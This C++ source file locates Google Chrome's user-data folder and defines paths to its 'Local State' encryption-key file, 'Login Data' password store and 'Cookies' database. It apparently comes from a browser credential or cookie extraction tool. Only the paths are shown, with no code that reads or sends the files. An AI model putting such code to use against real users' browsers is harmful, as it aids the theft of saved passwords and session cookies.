#include "browser.hxx"

#include <ShlObj.h>
#include <wil/resource.h>

namespace {
std::filesystem::path build_chrome_base_path() {
    wil::unique_cotaskmem_string local_appdata_path;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL, &local_appdata_path);

    std::filesystem::path ret = local_appdata_path.get();

    return ret / "Google" / "Chrome" / "User Data";
}

auto chrome_base_path = build_chrome_base_path();
}

namespace chrome {
std::filesystem::path key_path     = chrome_base_path / "Local State",
                      logins_path  = chrome_base_path / "Default" / "Login Data",
                      cookies_path = chrome_base_path / "Default" / "Cookies";
}